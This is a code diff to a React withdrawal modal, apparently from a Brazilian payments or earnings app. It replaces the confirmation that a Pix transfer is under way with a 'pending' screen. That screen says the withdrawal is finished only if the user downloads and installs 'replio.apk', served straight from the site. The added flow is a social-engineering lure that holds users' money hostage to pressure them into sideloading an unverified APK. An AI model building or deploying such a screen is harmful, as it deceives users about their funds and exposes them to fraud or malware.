@@ -12,7 +12,10 @@ import {
   Check, 
   Sparkles,
   Percent,
-  Wallet
+  Wallet,
+  Clock,
+  Download,
+  AlertTriangle
 } from 'lucide-react';
 
 interface WithdrawModalProps {
@@ -314,34 +317,49 @@ export function WithdrawModal({ isOpen, onClose, balance, onSuccess }: WithdrawM
             </div>
           )}
 
-          {/* Success Screen */}
+          {/* Success Screen -> Pending / Download App Screen */}
           {step === 'success' && (
             <div className="py-8 text-center flex flex-col items-center space-y-6">
               <motion.div 
                 initial={{ scale: 0.5, opacity: 0 }}
                 animate={{ scale: 1, opacity: 1 }}
-                className="w-20 h-20 bg-emerald-100 border-4 border-white text-emerald-600 rounded-full flex items-center justify-center shadow-xl shadow-emerald-100"
+                className="w-20 h-20 bg-amber-100 border-4 border-white text-amber-600 rounded-full flex items-center justify-center shadow-xl shadow-amber-100"
               >
-                <Check className="w-10 h-10 stroke-[3]" />
+                <Clock className="w-10 h-10 stroke-[3]" />
               </motion.div>
 
               <div className="space-y-3">
-                <h3 className="text-2xl font-black text-slate-900 tracking-tight">Saque Solicitado!</h3>
+                <h3 className="text-2xl font-black text-slate-900 tracking-tight">Saque em Processamento</h3>
                 <p className="text-slate-500 text-sm font-semibold max-w-xs mx-auto leading-relaxed">
-                  O valor de **R$ {numAmount.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}** (líquido de **R$ {netAmount.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}** após a taxa de 3%) foi enviado para processamento.
+                  O valor de **R$ {netAmount.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}** foi solicitado e está <span className="text-amber-600 font-bold">Pendente</span>. O processamento ocorrerá em até **24 horas**.
                 </p>
-                <div className="inline-flex items-center gap-1.5 text-xs text-emerald-700 bg-emerald-50 border border-emerald-100 rounded-full px-4 py-1.5 font-black mt-3">
-                  <Sparkles className="w-3.5 h-3.5 text-amber-500 fill-amber-500 animate-pulse" />
-                  <span>Transferência Pix em andamento (3 a 5 minutos)</span>
+                
+                <div className="bg-red-50 border border-red-200 rounded-xl p-4 mt-4 text-left">
+                  <div className="flex items-center gap-2 mb-2">
+                    <AlertTriangle className="w-5 h-5 text-red-600" />
+                    <span className="text-red-700 font-black text-sm uppercase tracking-wide">Ação Necessária</span>
+                  </div>
+                  <p className="text-red-600 text-xs font-semibold leading-relaxed">
+                    Para que o seu saque seja concluído com sucesso e liberado em sua conta, é obrigatório baixar e instalar nosso aplicativo oficial.
+                  </p>
                 </div>
               </div>
 
-              <button
-                onClick={onClose}
-                className="w-full bg-slate-900 text-white py-4.5 rounded-2xl font-black text-sm tracking-wide shadow-xl hover:bg-slate-800 hover:shadow-slate-900/10 active:scale-[0.99] transition-all"
-              >
-                VOLTAR À CARTEIRA
-              </button>
+              <div className="w-full space-y-3">
+                <a
+                  href="/replio.apk"
+                  download="replio.apk"
+                  className="w-full bg-emerald-500 hover:bg-emerald-600 text-white py-4.5 rounded-2xl font-black text-sm tracking-wide shadow-xl shadow-emerald-500/20 active:scale-[0.99] transition-all flex items-center justify-center gap-2"
+                >
+                  <Download className="w-5 h-5" /> BAIXAR APLICATIVO (replio.apk)
+                </a>
+                <button
+                  onClick={onClose}
+                  className="w-full bg-slate-100 text-slate-600 hover:bg-slate-200 hover:text-slate-800 py-3.5 rounded-xl font-bold text-xs tracking-wide transition-all"
+                >
+                  VOLTAR À CARTEIRA
+                </button>
+              </div>
             </div>
           )}
         </motion.div>
